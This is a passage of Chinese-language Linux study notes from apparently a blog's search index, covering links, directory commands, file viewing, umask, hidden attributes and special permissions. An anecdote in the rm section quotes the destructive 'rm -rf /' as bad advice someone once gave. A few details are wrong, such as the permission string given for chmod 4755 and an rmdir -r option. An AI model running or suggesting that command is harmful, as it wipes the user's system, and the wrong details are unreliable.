/sys/fs/cgroup</span><br><span class="line">/dev/mapper/centos-root 10475520  4250208 6225312   41% /</span><br><span class="line">/dev/sda2                1038336   174128  864208   17% /boot</span><br><span class="line">/dev/mapper/centos-home  5232640   122516 5110124    3% /home</span><br><span class="line">tmpfs                      99576        4   99572    1% /run/user/42</span><br><span class="line">tmpfs                      99576       40   99536    1% /run/user/1000</span><br><span class="line">/dev/sr0                10767514 10767514       0  100% /run/media/manu/CentOS 7 x86_64</span><br></pre></td></tr></table></figure><p>这里说一下sr0，sr0是CD-ROM，无法写入，所以使用100%</p><h3 id="du"><a href="#du" class="headerlink" title="du"></a>du</h3><ul><li>会去文件系统内找当前目录或选定目录的文件数据</li><li><code>du [-] dirname/filename</code></li><li><code>-a</code>列出所有的文件和目录容量，<strong>默认是目录容量</strong></li><li><code>-h</code>以易读的形式显示</li><li><code>-s</code>仅列出该目录的总量</li><li><code>-S</code> 仅列出子目录</li><li><code>-k</code>默认值</li><li><code>-m</code></li></ul><h3 id="硬链接Hard-link"><a href="#硬链接Hard-link" class="headerlink" title="硬链接Hard link"></a>硬链接Hard link</h3><p>我们知道，创建文件时会有一个inode，而目录是通过记录文件的inode来链接到该文件的</p><p>所谓硬式链接就是：<strong>在某目录下创建一个文件，而这个文件的inode是我所需要的文件的inode</strong></p><p>实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]<span class="comment"># ll -i yangyong.text </span></span><br><span class="line">3705 -rw-r--r--. 1 root root 0 1月   2 22:29 yangyong.text</span><br><span class="line">[root@study /]<span class="comment"># ln yangyong.text test</span></span><br><span class="line">[root@study /]<span class="comment"># ll -i yangyong.text test </span></span><br><span class="line">3705 -rw-r--r--. 2 root root 0 1月   2 22:29 <span class="built_in">test</span></span><br><span class="line">3705 -rw-r--r--. 2 root root 0 1月   2 22:29 yangyong.text</span><br></pre></td></tr></table></figure><ul><li><p><code>2</code>表示有两个文件链接到了这个inode</p></li><li><p>比较安全(相当于备份)</p></li><li><p>硬链接一般不会占磁盘空间大小</p></li></ul><p><strong>限制</strong></p><ul><li>只能在同一个文件系统</li><li>不能链接目录</li></ul><h3 id="符号链接Symbolic-Link"><a href="#符号链接Symbolic-Link" class="headerlink" title="符号链接Symbolic Link"></a>符号链接Symbolic Link</h3><p>建立一个文件，这个文件记录的是我所需要的文件的<strong>文件名</strong></p><p>实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]<span class="comment"># ln -s yangyong.text test2</span></span><br><span class="line">[root@study /]<span class="comment"># ll test2</span></span><br><span class="line">lrwxrwxrwx. 1 root root 13 1月   7 22:49 test2 -&gt; yangyong.text</span><br></pre></td></tr></table></figure><ul><li><p>test2的文件大小13B，源文件的文件名也是13个字符</p></li><li><p>源文件没了，链接文件会找不到文件</p></li><li><p>符号链接就相当于Windows的快捷方式</p></li></ul><h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h3><ul><li><code>ln [-] sourcefile linkname</code></li><li><code>-s</code>符号链接，默认硬链接</li><li><code>-f</code>若有这个linkname则将文件删除再创建</li></ul><blockquote><p>创建一个目录时，这个目录下默认至少有两个文件，<code>.</code>and<code>..</code>，所有新目录会有两个链接数，父目录也会增加一个目录数</p></blockquote><hr><blockquote><p>参考《鸟哥的Linux私房菜 基础学习篇》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件系统 </tag>
            
            <tag> inode </tag>
            
            <tag> ext2 </tag>
            
            <tag> ext4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（四）Linux文件和目录</title>
      <link href="/Linux/4.%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6.html"/>
      <url>/Linux/4.%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6.html</url>
      
        <content type="html"><![CDATA[<p> 深入理解2</p><span id="more"></span><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><ul><li>相对路径</li></ul><p>顾名思义，相对与本层路径的路径，使用<code>../</code>回到上一层目录</p><ul><li>绝对路径</li></ul><p>路径从根目录写起</p><h2 id="操作目录"><a href="#操作目录" class="headerlink" title="操作目录"></a>操作目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.代表此层目录</span><br><span class="line">..上一层目录</span><br><span class="line">-前一个工作目录</span><br><span class="line">~使用者身份的家目录</span><br><span class="line">~accountaccount的家目录</span><br></pre></td></tr></table></figure><p>每个目录下都有<code>.</code>、<code>..</code>这两个目录</p><p>根目录的<code>..</code>就是它自己</p><p>处理目录的指令</p><ul><li><p><strong>cd</strong>(change directory)</p></li><li><p><strong>pwd</strong>(Print working directory)</p><ul><li>使用<code>pwd -p</code>可显示链接文件的完整目录</li></ul></li><li><p><strong>mkdir</strong>(make directory)</p><ul><li><p><strong>-m</strong>创建目录时设定权限，默认权限与<strong>umask</strong>有关</p><p>如<code>mkdir -m 711 test</code></p></li><li><p><strong>-p</strong>递归创建目录</p><p>如<code>mkdir -p 1/2/3/4</code></p></li></ul></li><li><p><strong>rmdir</strong>(remove directory)</p><ul><li>仅删除空目录(empty directory)</li><li><code>-r</code>不管有没有文件和目录都删除，有点危险</li><li><code>-p</code>递归删除，也要空目录才行</li></ul></li></ul><h2 id="路径变量-PATH"><a href="#路径变量-PATH" class="headerlink" title="路径变量$PATH"></a>路径变量$PATH</h2><p>使用的指令是可执行文件，例如<code>ls</code>在<strong>/bin/ls</strong>，为什么在任何地方都可以执行这个指令呢？这就是环境变量<code>PATH</code>的原因</p><p>查看一下PATH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@study /]<span class="comment"># echo $PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure><ul><li><p>由一堆目录组成，每个目录用：隔开</p></li><li><p>添加目录：<code>PATH=&quot;$&#123;PATH&#125;:目录&quot;</code></p></li><li><p>不同身份的PATH不同，指令也不同，例如root和普通用户</p></li><li><p><code>.</code>目录建议别加入PATH，防止被有心人执行恶意指令</p></li></ul><h2 id="文件和目录管理"><a href="#文件和目录管理" class="headerlink" title="文件和目录管理"></a>文件和目录管理</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><ul><li>显示目录和文件，默认显示操作目录</li><li>常用<code>l</code>(显示权限)、<code>a</code>(显示隐藏文件)、<code>d</code></li><li><code>ll</code>表示<code>ls -l</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-C     多列输出，纵向排序。</span><br><span class="line"></span><br><span class="line">  -F     每个目录名加“   /  ”后缀，每个  FIFO  名加“  |  ”后缀，</span><br><span class="line">         每个可运行名加“ * ”后缀。</span><br><span class="line"></span><br><span class="line">  -R     递归列出遇到的子目录。</span><br><span class="line"></span><br><span class="line">  -a     列出所有文件，包括以 <span class="string">&quot;.&quot;</span> 开头的隐含文件。</span><br><span class="line"></span><br><span class="line">  -c     使用“状态改变时间”代替“文件修改时间”为依据来排序</span><br><span class="line">         （使用“ -t ”选项时）或列出（使用“ -l ”选项时）。</span><br><span class="line"></span><br><span class="line">  -d     将目录名象其它文件一样列出，而不是列出它们的内容。</span><br><span class="line"></span><br><span class="line">  -i     输出文件前先输出文件系列号（即  i  节点号:  i-node num‐</span><br><span class="line">         ber）。  -l  列出（以单列格式）文件模式（   file   mode</span><br><span class="line">         ），文件的链</span><br><span class="line">         接数，所有者名，组名，文件大小（以字节为单位），时间信</span><br><span class="line">         息，及文件名。缺省时，时间信息显示最近修改时间；可以以</span><br><span class="line">         选项“  -c  ”和“  -u   ”选择显示其它两种时间信息。对于设</span><br><span class="line">         备文件，原先显示文件大小的区域通常显示的是主要和次要的</span><br><span class="line">         号（majorand minor device numbers）。</span><br><span class="line"></span><br><span class="line">  -q     将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。）</span><br><span class="line"></span><br><span class="line">  -r     逆序排列。</span><br><span class="line"></span><br><span class="line">  -t     按时间信息排序。</span><br><span class="line"></span><br><span class="line">  -u     使用最近访问时间代替最近修改时间为依据来排序（使用 “ -t</span><br><span class="line">         ”选项时）或列出（使用“ -l ”选项时）。</span><br><span class="line"></span><br><span class="line">  -1 单列输出。</span><br></pre></td></tr></table></figure><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><ul><li><code>cp [选项] 源文件 目标文件/目录</code></li><li><code>cp [选项] 目录 目标路径</code></li><li>复制时注意文件属性，比如备份注意<code>-a</code>，<code>-p</code>，复制给其他用户时要注意文件权限<ul><li><strong>用户若没有权限更改某些属性，使用-a也没用</strong></li></ul></li><li>使用<code>-l</code>创建硬链接(hard link)，<code>-s</code>创建符号链接(symbolic link)，符号连接有<code>-&gt;</code>符号</li><li>当文件更新才复制使用<code>-u</code></li><li><strong>如果源文件两个以上，则最后一个一定要是目录</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">   -a, --archive</span><br><span class="line">             复制时,尽可能保持文件的结构和属性.(但不保持目录 结构)等同于 -dpR。</span><br><span class="line">             </span><br><span class="line">      -d, --no-dereference</span><br><span class="line">             复制符号链接作为符号链接而不是复制它指向的文件, 并且保护在副本中原文件之间的硬链接.</span><br><span class="line"></span><br><span class="line">      -f, --force</span><br><span class="line">             删除存在的目标文件。 （较：原译文缺下面的部分）</span><br><span class="line"></span><br><span class="line">      -i, --interactive</span><br><span class="line">             无论是否覆盖现存文件都作提示。</span><br><span class="line"></span><br><span class="line">      -l, --link</span><br><span class="line">             制作硬链接代替非目录拷贝。</span><br><span class="line"></span><br><span class="line">      -p, --preserve</span><br><span class="line">             保持原始文件的所有者，组，许可，和时间表属性。</span><br><span class="line"></span><br><span class="line">      -P, --parents</span><br><span class="line">             一个斜杠和指定的源文件名构成目的文件。 最后送给 cp 的参数必须是一个已存在的目录的名字。例如, 下面这个命令:</span><br><span class="line">             cp --parents a/b/c existing_dir</span><br><span class="line">             复制文件 `a/b/c<span class="string">&#x27; 到 texisting_dir(现有的目录)/a/b/c&#x27;</span>,建立任 何缺少的中间目录。</span><br><span class="line"></span><br><span class="line">      -r     递归地复制目录,复制任何非目录和非符号链接(那是,FIFOs和特别文件)好象他们是常规的文件一样看待.这  意味着尝试读出每个源文件的数据,和把它写到目的地</span><br><span class="line">             上.因而,用这个选项,cp<span class="string">&#x27;可能彻底地终止,当不确定地读一个FIFO或者/dev/tty时,(这是一个缺陷.它意味着如果你不知道在这棵树(目录)中有什么要复制的时候,</span></span><br><span class="line"><span class="string">             你不得不避开-r并使用-R打开一个未知的设备文件, 比如说一台扫描仪,会有未知的效果发生在硬件上)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -R, --recursive</span></span><br><span class="line"><span class="string">             递归地复制目录,保留非目录(参见上面的 -r ).</span></span><br><span class="line"><span class="string">--sparse=WHEN</span></span><br><span class="line"><span class="string">             一个稀疏file&#x27;</span>包容`holes<span class="string">&#x27;-占用0字节,它不占用任何物理块;系统把他们作为0调用read&#x27;</span>来读.由于许多二进制文件包容许多连续的0字节,这样能保存相当的磁盘空</span><br><span class="line">             间并且加快速度.省缺情况下, cp 通过自然的启发方式发现在源文件里holes并且使相关的输出文件稀疏.</span><br><span class="line"></span><br><span class="line">             WHEN 值能够是下面中的一个：</span><br><span class="line"></span><br><span class="line">             auto   默认的行为:如果输入文件是稀疏的,输出文件也是稀疏的.</span><br><span class="line"></span><br><span class="line">             always 总是使输出文件稀疏.当输入文件所在的文件系统不支 持稀疏文件的时候，这是有用的,但是输出文件所在的 文件系统需要(支持稀疏文件).</span><br><span class="line"></span><br><span class="line">             never  从不使输出文件稀疏.如果你找到一个需要此选项的应 用程序,让我们知道.</span><br><span class="line"></span><br><span class="line">      -s, --symbolic-link</span><br><span class="line">             生成符号链接代替非目录拷贝.所有的源文件名必须是 绝对的(由`/<span class="string">&#x27;开始),除非目的文件是在当前目录.这选 项仅仅在系统不支持符号链接时引起一个错误消息.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -u, --update</span></span><br><span class="line"><span class="string">             如果存在的目的地有相同的,或者更新的修改时间,不复制非目录(文件).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -v, --verbose</span></span><br><span class="line"><span class="string">             在复制前印出文件名.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      -x, --one-file-system</span></span><br><span class="line"><span class="string">             跳过来自不同文件系统的子目录.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><ul><li><code>-f</code>(force)，忽略不存在的文件，不警告</li><li><code>-i</code>，删除有提示，防止删错</li><li><code>-r</code>，递归删除，删除这个目录下的所有东西，不提示</li></ul><blockquote><p>我逛酷安时看到一老哥手机变砖求助，一小伙子正经的说在终端输入rm -rf /，最牛逼的是这老哥还真试了，然后emmm（笑哭）</p></blockquote><ul><li>要注意若文件名与指令重合，使用<code>./</code></li></ul><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><ul><li>用于移动文件或者重命名</li><li><code>-f</code>，存在不会提示</li><li><code>-i</code>，存在提示是否覆盖</li><li><code>-u</code>，文件较新才会更新</li><li>可以移动多个文件<code>mv t1 t2 t3 目录</code></li></ul><p>改名字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv test1 test2</span><br></pre></td></tr></table></figure><ul><li>使用<code>rename</code>可以批量修改文件名</li></ul><h3 id="获取文件名和目录名"><a href="#获取文件名和目录名" class="headerlink" title="获取文件名和目录名"></a>获取文件名和目录名</h3><ul><li><code>basename</code></li><li><code>dirname</code></li></ul><h2 id="显示文件内容"><a href="#显示文件内容" class="headerlink" title="显示文件内容"></a>显示文件内容</h2><h3 id="cat-concatenate"><a href="#cat-concatenate" class="headerlink" title="cat(concatenate)"></a>cat(concatenate)</h3><ul><li>将文件的内容连续打印在屏幕上</li><li><code>-A</code>可以显示一些特殊字符，比如<code>TAB</code>是<code>^I</code>，换行是<code>$</code></li><li><code>-n</code>可以打印行号</li></ul><h3 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h3><ul><li>是cat的反序，意思就是从最后一行打印到第一行</li></ul><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><ul><li>添加行号打印</li><li><code>-b a</code>不管是否有空行，都打印行号，<code>-b t</code>不打印空行(默认值)</li><li><code>-n ln</code>行号在最左边显示，<code>-n rn</code>在右边显示行号，不补齐0，<code>-n nz</code>补齐0（默认6位）</li><li><code>-w</code>可以设置补齐位数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># nl -b a -n rz -w 4 /etc/issue</span></span><br><span class="line">0001\S</span><br><span class="line">0002Kernel \r on an \m</span><br><span class="line">0003</span><br></pre></td></tr></table></figure><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># more /etc/man_db.conf </span></span><br><span class="line">内容略</span><br><span class="line">--More--(36%)</span><br></pre></td></tr></table></figure><ul><li>可以一页一页的翻动，而不是像cat那样全部显示出来<ul><li><code>space</code>：向下<strong>翻页</strong></li><li><code>enter</code>：向下<strong>翻一行</strong></li><li><code>/string</code>：搜索字符串，n向下搜索</li><li><code>:f</code>：显示文件名和当前行数</li><li><code>q</code>：离开more</li><li><code>b</code>或<code>ctrl+b</code>：往回翻页，对文件有效，对管道无效</li></ul></li></ul><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><ul><li>比more功能更多</li><li><code>space、PD</code>：向下翻页</li><li><code>PU</code>：向上翻页</li><li><code>/string</code></li><li><code>?string</code></li><li><code>n</code></li><li><code>N</code></li><li><code>g</code>：回到开头</li><li><code>G</code>：结尾</li><li><code>q</code>：离开</li></ul><h2 id="数据截取"><a href="#数据截取" class="headerlink" title="数据截取"></a>数据截取</h2><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><ul><li>显示前几行，默认10行</li><li>-n num可以显示num行<ul><li>num是负数表示的意思是后面num行不显示</li></ul></li></ul><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><ul><li>显示后面几行</li><li><code>-n num</code><ul><li><code>-n +num</code>表示文件会从num行后加载出来</li></ul></li><li><code>-f</code>表示刷新显示这个文件，<code>ctrl+c</code>停止</li></ul><blockquote><p>如何显示中间的5-6行？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 6 file | tail -n 2</span><br></pre></td></tr></table></figure><p><code>|</code>是一个管道指令，表示前面的信息交由后面的指令执行</p><p>如何显示5-6行的行号？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n file | head -n 6 | tail -n 2</span><br></pre></td></tr></table></figure></blockquote><h2 id="非纯文本文件"><a href="#非纯文本文件" class="headerlink" title="非纯文本文件"></a>非纯文本文件</h2><h3 id="od"><a href="#od" class="headerlink" title="od"></a>od</h3><ul><li><code>od [-t TYPE]</code></li><li><code>TYPE</code><ul><li><strong>a</strong>：named character, ignoring high-order bit，默认字符输出</li><li><strong>c</strong>：ASCII输出</li><li><strong>d</strong>[size]：利用十进制(<code>decimal</code>)输出数据，每个数据占size字节</li><li><strong>f</strong>[size]：利用浮点数值(<code>floating</code>)输出数据，每个数据占size字节</li><li><strong>o</strong>[size]：利用八进制(<code>octal</code>)输出数据，每个数据占size字节</li><li><strong>x</strong>[size]：利用十六进制(<code>hexadecimal</code>)输出数据，每个数据占size字节</li></ul></li></ul><blockquote><p>size可以用整数或者大写字母<code>C</code>(sizeof(char)),<code>S</code>(sizeof(shot)),<code>I</code>(sizeof(int)),<code>L</code>(sizeof(long))</p><p>官方文献</p><p>If TYPE is f, SIZE may also be F for sizeof(float),</p><p>D for sizeof(double) or L for sizeof(long double).</p><p>实践在数据若没有到高四位时，使用<code>0011</code>填充，</p><p><strong>按1字节从低位向高位填充</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例如</span><br><span class="line">[root@study ~]<span class="comment"># echo 0123 |od -t dCc</span></span><br><span class="line">0000000   48   49   50   51   10</span><br><span class="line">           0    1    2    3   \n</span><br><span class="line">0000005</span><br><span class="line">[root@study ~]<span class="comment"># echo 0123 | od -t dSc</span></span><br><span class="line">0000000   12592   13106      10</span><br><span class="line">          0   1   2   3  \n</span><br><span class="line">0000005</span><br></pre></td></tr></table></figure></blockquote><h2 id="修改文件时间或创建新文件"><a href="#修改文件时间或创建新文件" class="headerlink" title="修改文件时间或创建新文件"></a>修改文件时间或创建新文件</h2><h3 id="三个时间参数"><a href="#三个时间参数" class="headerlink" title="三个时间参数"></a>三个时间参数</h3><ul><li>modification time，mtime<ul><li>修改时间</li><li>当文件的内容改动时就会更新这个时间</li></ul></li><li>status time，ctime<ul><li>状态时间</li><li>文件的状态，也就是文件的属性、权限</li></ul></li><li>access time，atime<ul><li>读取时间</li><li>文件被读取，这个时间就会被更新</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># date;ll /etc/man_db.conf ;ll --time=atime /etc/man_db.conf ;ll --time=ctime /etc/man_db.conf </span></span><br><span class="line">2020年 01月 02日 星期四 17:45:20 CST</span><br><span class="line">-rw-r--r--. 1 root root 5171 10月 31 2018 /etc/man_db.conf</span><br><span class="line">-rw-r--r--. 1 root root 5171 1月   2 03:44 /etc/man_db.conf</span><br><span class="line">-rw-r--r--. 1 root root 5171 12月 28 07:32 /etc/man_db.conf</span><br></pre></td></tr></table></figure><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><ul><li><code>touch [-acdmt] 文件</code></li><li><code>-a</code>：自定义access time</li><li><code>-c</code>：若没有这个文件则不建立新文件</li><li>-<code>d</code>：后面接自定义的时间，同–date=”日期或时间”</li><li><code>-m</code>：修改modification time</li><li><code>-t</code>：使用自定义时间，格式[YYYYMMDDhhmm]</li></ul><p>一般用法：</p><ul><li>创建空文件</li><li>修改问文件时间atime和mtime</li></ul><h2 id="默认权限umask"><a href="#默认权限umask" class="headerlink" title="默认权限umask"></a>默认权限umask</h2><p><strong>umask用来指定用户在创建文件的权限的默认值</strong></p><p>两种方式查看umask</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># umask</span></span><br><span class="line">0022</span><br><span class="line">[root@study ~]<span class="comment"># umask -S</span></span><br><span class="line">u=rwx,g=rx,o=rx</span><br></pre></td></tr></table></figure><ul><li>文件属性默认666</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-rw-</span><br></pre></td></tr></table></figure><ul><li>目录属性777</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxrwxrwx</span><br></pre></td></tr></table></figure><p><strong>umask代表拿掉权限，只看后面3个数字</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">建立文件:(-rw-rw-rw-)-(-----w--w-)==&gt;-rw--r--r--</span><br><span class="line">建立目录:(drwxrwxrwx)-(d----w--w-)==&gt;drwxr-xr-x</span><br><span class="line">注意：777-022=755,666-022=644虽然是没错</span><br><span class="line">但是有特殊情况比如：</span><br><span class="line">(-rw-rw-rw-)-(--------wx)==&gt;-rw---r--r--</span><br><span class="line">666-003=663，原本没有x，怎么变成了-wx</span><br></pre></td></tr></table></figure><p>设置umask</p><ul><li><code>umask 002</code></li></ul><h2 id="文件隐藏属性"><a href="#文件隐藏属性" class="headerlink" title="文件隐藏属性"></a>文件隐藏属性</h2><p>隐藏属性对于系统安全（Security）是很有帮助的</p><h3 id="chattr配置隐藏属性"><a href="#chattr配置隐藏属性" class="headerlink" title="chattr配置隐藏属性"></a>chattr配置隐藏属性</h3><ul><li><p><code>chattr [+-=][ASacdistu] file/dir</code></p></li><li><p>只能在ext2、ext3、ext4的Linux传统文件系统上完整生效</p></li><li><p>xfs只支持<code>AadiS</code>参数</p></li><li><p><code>+</code>添加属性</p></li><li><p><code>-</code></p></li><li><p><code>=</code>直接配置属性</p></li><li><p><code>A</code>atime不能被修改</p></li><li><p><code>S</code>一般是非同步写入磁盘，加上后，任何修改都会同步写入磁盘</p></li><li><p><code>a</code>只能添加数据，不能删除和修改，root才能设置</p></li><li><p><code>c</code>将文件压缩，读取会自动解压缩</p></li><li><p><code>d</code>当dump程序执行时，可以不被dump备份</p></li><li><p><code>i</code>可以让一个文件不能被删、改名、添加数据，root</p></li><li><p><code>s</code>使文件可以被完全删除，无法恢复</p></li><li><p><code>u</code>删除可以恢复</p></li></ul><h3 id="lsattr显示文件隐藏属性"><a href="#lsattr显示文件隐藏属性" class="headerlink" title="lsattr显示文件隐藏属性"></a>lsattr显示文件隐藏属性</h3><ul><li><code>lsattr [-adR]</code></li><li><code>-a</code>将隐藏文件的属性也显示出来</li><li><code>-d</code>如果是目录，仅列出目录本身属性而非目录的文件名</li><li><code>-R</code>连同子目录的数据也一并列出来</li></ul><h2 id="文件的特殊权限"><a href="#文件的特殊权限" class="headerlink" title="文件的特殊权限"></a>文件的特殊权限</h2><h3 id="Set-UID"><a href="#Set-UID" class="headerlink" title="Set UID"></a>Set UID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@study tmp]<span class="comment"># ll /usr/bin/passwd </span></span><br><span class="line">-rwsr-xr-x. 1 root root 27856 8月   9 09:39 /usr/bin/passwd</span><br></pre></td></tr></table></figure><ul><li><strong>SUID</strong>仅对二进制程序(binary program)有效</li><li>执行者需要对该程序有x权限</li><li>本权限在执行过程中有效</li><li>执行者将具有该程序的拥有者权限（owner）</li></ul><p>需要注意的是SUID不能用在shell脚本和目录上</p><h3 id="Set-GID"><a href="#Set-GID" class="headerlink" title="Set GID"></a>Set GID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@study tmp]<span class="comment"># ll /usr/bin/locate</span></span><br><span class="line">-rwx--s--x. 1 root slocate 40520 4月  11 2018 /usr/bin/locate</span><br></pre></td></tr></table></figure><p>与SUID不同，SGID针对文件和目录</p><p>对于文件</p><ul><li>SGID对二进制程序有用</li><li>执行需要x权限</li><li>执行者在执行过程中会获得程序用户组的支持</li></ul><p>对于目录</p><ul><li>用户对该目录有r、x权限才能进入该目录</li><li>用户在目录下的有效用户组将会变成该目录的用户组</li><li>用途：若用户有w权限，则用户创建的新文件的用户组与该目录的用户组相同</li></ul><h3 id="Sticky-Bit"><a href="#Sticky-Bit" class="headerlink" title="Sticky Bit"></a>Sticky Bit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@study tmp]<span class="comment"># ll -d /tmp/</span></span><br><span class="line">drwxrwxrwt. 58 root root 8192 1月   2 19:41 /tmp/=</span><br></pre></td></tr></table></figure><p>SBIT只对目录有效</p><ul><li>当用户具有wx权限</li><li>当用户建立文件或目录时，仅root和用户才有权利删除</li></ul><h3 id="权限的设置"><a href="#权限的设置" class="headerlink" title="权限的设置"></a>权限的设置</h3><p>数字</p><ul><li>SUID=4</li><li>SGID=2</li><li>SBIT=1</li></ul><p><code>chmod 4755 file</code>即表示-rwsrw-rw-</p><p>符号</p><ul><li>SUID=u+s</li><li>SGID=g+s</li><li>SBIT=o+t</li></ul><blockquote><p>-rwSrwSrwT表示没有x权限，小写才有x权限</p></blockquote><h2 id="观察文件类型"><a href="#观察文件类型" class="headerlink" title="观察文件类型"></a>观察文件类型</h2><p>使用<code>file 文件名</code>可以简单的判断文件的格式</p><h2 id="查找命令和文件"><a href="#查找命令和文件" class="headerlink" title="查找命令和文件"></a>查找命令和文件</h2><h3 id="查找脚本文件"><a href="#查找脚本文件" class="headerlink" 